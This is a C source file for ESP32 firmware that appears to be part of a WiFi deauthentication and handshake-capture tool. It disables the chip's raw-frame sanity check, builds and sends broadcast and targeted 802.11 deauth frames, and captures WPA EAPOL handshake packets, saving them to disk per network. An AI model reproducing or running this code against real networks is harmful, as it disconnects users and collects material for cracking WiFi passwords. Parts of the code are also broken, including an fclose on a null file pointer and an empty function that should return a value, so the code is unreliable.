#include <stdio.h>

#include "esp_wifi.h"
#include "esp_log.h"

#include "eapol.h"
#include "mac_logger.h"
#include "pkt_sniffer.h"


static const char* TAG = "PKT SNIFFER";
#define EAPOL_MAX_PKT_LEN 256

uint8_t auth_req[EAPOL_MAX_PKT_LEN];
uint8_t auth_res[EAPOL_MAX_PKT_LEN];
uint8_t asoc_req[EAPOL_MAX_PKT_LEN];
uint8_t asoc_res[EAPOL_MAX_PKT_LEN];
uint8_t eapol_01[EAPOL_MAX_PKT_LEN];
uint8_t eapol_02[EAPOL_MAX_PKT_LEN];
uint8_t eapol_03[EAPOL_MAX_PKT_LEN];
uint8_t eapol_04[EAPOL_MAX_PKT_LEN];

//*****************************************************************************
// Deauth Stuff
//*****************************************************************************

/**
 * @brief Deauthentication frame template
 * 
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 * 
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

/**
 * @brief Decomplied function that overrides original one at compilation time.
 * 
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

esp_err_t wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    return esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
}

esp_err_t wsl_bypasser_send_deauth_frame(uint8_t* ap_mac){
    ESP_LOGD(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_mac, 6);
    memcpy(&deauth_frame[16], ap_mac, 6);
    
    return wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

esp_err_t wsl_bypasser_send_deauth_frame_targted(uint8_t* ap_mac, uint8_t* sta_mac)
{
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[4], sta_mac, 6);
    memcpy(&deauth_frame[10], ap_mac, 6);
    memcpy(&deauth_frame[16], ap_mac, 6);
    
    return wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}


//*****************************************************************************
// Packet Parsing Helpers
//*****************************************************************************

// assume type is known to be data
static inline int8_t get_eapol_index(uint8_t* p, wifi_pkt_rx_ctrl_t* rx_ctrl)
{
    uint16_t len = rx_ctrl->sig_len;

    if((len> 0x22) && (p[0x20] == 0x88) && (p[0x21] == 0x8e))
    {
        // eapol
        int16_t s = ((dot11_header_t*) p)->sequence_num;
        uint8_t ds = ((dot11_header_t*) p)->ds_status;

        if     (s == 0 && ds == 2) { return 0; }
        else if(s == 0 && ds == 1) { return 1; }
        else if(s == 1 && ds == 2) { return 2; }
        else if(s == 1 && ds == 1) { return 3; }
    }

    return -1;
}

//*****************************************************************************
// Handling Eapol PKTS
//*****************************************************************************

static void eapol_dump_to_disk(uint8_t ap_index)
{
    char path[MAX_SSID_LEN];

    snprintf(path, MAX_SSID_LEN, "%s/%.19s.pkt", MOUNT_PATH, ap_list[ap_index].ssid);
    
    ESP_LOGI(TAG, "Opening %s to writeout eapol pkts", path);
    FILE* f = fopen(path, "w");
    if(!f)
    {
        ESP_LOGE(TAG, "Failed to open %s - %s", path, strerror(errno));
        fclose(f);
        return;
    }

    size_t num_written = fwrite(ap_list[ap_index].eapol_pkt_lens, 1, 2*EAPOL_NUM_PKTS, f);
    if(num_written != 2 * EAPOL_NUM_PKTS)
    {
        ESP_LOGE(TAG, "Failed to write EAPOL Header (%d / %d)", num_written, 2*EAPOL_NUM_PKTS);
        fclose(f);
        return;
    }

    uint8_t i;
    for(i = 0; i < EAPOL_NUM_PKTS; ++i)
    {
        num_written = fwrite(ap_list[ap_index].eapol_buffer + i*EAPOL_MAX_PKT_LEN, 1, ap_list[ap_index].eapol_pkt_lens[i], f);
        if(num_written != ap_list[ap_index].eapol_pkt_lens[i])
        {
            ESP_LOGE(TAG, "Failed to write EAPOL %d Pkt (%d / %d)", i, num_written, ap_list[ap_index].eapol_pkt_lens[i]);
            fclose(f);
            return;
        }
    }
    
    fclose(f);
    ESP_LOGI(TAG, "Write out of EAPOL pkts successful!");
}

void parse_eapol_pkt(uint8_t eapol_index, uint8_t* p, wifi_pkt_rx_ctrl_t* rx_ctrl)
{
    if(rx_ctrl->sig_len >= EAPOL_MAX_PKT_LEN)
    {
        ESP_LOGE(TAG, "Recved EAPOL pkt with len greater than %d", EAPOL_MAX_PKT_LEN);
        return;
    }

    if(_take_lock()){ return; }

    int8_t ap_index;
    find_ap(p + 16, &ap_index);
    if(ap_index < 0)
    {
        ESP_LOGE(TAG, "Recieved EAPOL pkt for unregistered AP??");
        _release_lock();
        return;
    }

    if(ap_list[ap_index].eapol_pkt_lens[eapol_index] != 0)
    {
        ESP_LOGE(TAG, "Possibly recved duplicate eapol pkt: %d", eapol_index);
    }

    memcpy(ap_list[ap_index].eapol_buffer + (eapol_index*EAPOL_MAX_PKT_LEN), p, rx_ctrl->sig_len);
    ap_list[ap_index].eapol_pkt_lens[eapol_index] = rx_ctrl->sig_len;
    ESP_LOGI(TAG, "%s -> Eapol Captured (%d/6)", ap_list[ap_index].ssid, eapol_index);

    uint8_t i;
    for(i = 0; i < EAPOL_NUM_PKTS; ++i)
    {
        if(ap_list[ap_index].eapol_pkt_lens[i] == 0)
        {
            _release_lock();
            return;
        }
    }

    eapol_dump_to_disk(ap_index);

    _release_lock();
    return;
}

//*****************************************************************************
// API funcs
//*****************************************************************************

esp_err_t eapol_logger_init(uint8_t mac_logger_ap_index, uint8_t mac_logger_sta_index)
{

}
